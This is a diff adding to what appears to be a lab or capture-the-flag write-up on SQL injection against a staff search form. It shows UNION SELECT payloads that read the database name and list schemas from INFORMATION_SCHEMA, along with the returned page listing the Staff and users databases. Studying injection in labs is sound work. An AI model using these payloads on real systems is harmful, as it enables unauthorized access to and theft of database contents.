@@ -37,3 +37,11 @@ search=killer' UNION SELECT database(),2,3,4,5,6-- -
 <h3>Search results </h3> 
 ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
+### using INFORMATION_SCHEMA
+```
+search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -
+```
+```
+<h3>Search results </h3> 
+ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
+```
